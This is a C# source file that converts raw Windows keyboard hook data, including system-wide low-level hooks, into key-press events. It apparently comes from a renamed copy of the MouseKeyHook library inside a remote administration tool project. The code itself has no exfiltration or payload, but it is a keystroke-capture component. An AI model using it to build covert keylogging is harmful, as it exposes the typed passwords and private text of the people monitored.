using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using xServer.KuuhakuCekirdek.MouseKeyHook.WinApi;

namespace xServer.KuuhakuCekirdek.MouseKeyHook
{
    public class EventArgsTuşBasışı : KeyPressEventArgs
    {
        internal EventArgsTuşBasışı(char keyChar, int timestamp)
            : base(keyChar)
        {
            IsNonChar = keyChar == (char) 0x0;
            Timestamp = timestamp;
        }

        public EventArgsTuşBasışı(char keyChar)
            : this(keyChar, Environment.TickCount)
        {
        }

        public bool IsNonChar { get; private set; }
        public int Timestamp { get; private set; }

        internal static IEnumerable<EventArgsTuşBasışı> FromRawDataApp(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;


            const uint maskKeydown = 0x40000000; // bit 30 için
            const uint maskKeyup = 0x80000000; // bit 31 için xd
            const uint maskScanCode = 0xff0000; // bit 23-16 için

            var flags = (uint) lParam.ToInt64();

            var wasKeyDown = (flags & maskKeydown) > 0;
            var isKeyReleased = (flags & maskKeyup) > 0;

            if (!wasKeyDown && !isKeyReleased)
            {
                yield break;
            }

            var virtualKeyCode = (int) wParam;
            var scanCode = checked((int) (flags & maskScanCode));
            const int fuState = 0;

            char[] chars;

            KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
            if (chars == null) yield break;
            foreach (var ch in chars)
            {
                yield return new EventArgsTuşBasışı(ch);
            }
        }

        internal static IEnumerable<EventArgsTuşBasışı> FromRawDataGlobal(CallbackData data)
        {
            var wParam = data.WParam;
            var lParam = data.LParam;

            if ((int) wParam != Messages.WM_KEYDOWN)
            {
                yield break;
            }

            var keyboardHookStruct =
                (KeyboardHookStruct) Marshal.PtrToStructure(lParam, typeof (KeyboardHookStruct));

            var virtualKeyCode = keyboardHookStruct.VirtualKeyCode;
            var scanCode = keyboardHookStruct.ScanCode;
            var fuState = keyboardHookStruct.Flags;

            if (virtualKeyCode == KeyboardNativeMethods.VK_PACKET)
            {
                var ch = (char) scanCode;
                yield return new EventArgsTuşBasışı(ch, keyboardHookStruct.Time);
            }
            else
            {
                char[] chars;
                KeyboardNativeMethods.TryGetCharFromKeyboardState(virtualKeyCode, scanCode, fuState, out chars);
                if (chars == null) yield break;
                foreach (var current in chars)
                {
                    yield return new EventArgsTuşBasışı(current, keyboardHookStruct.Time);
                }
            }
        }
    }
}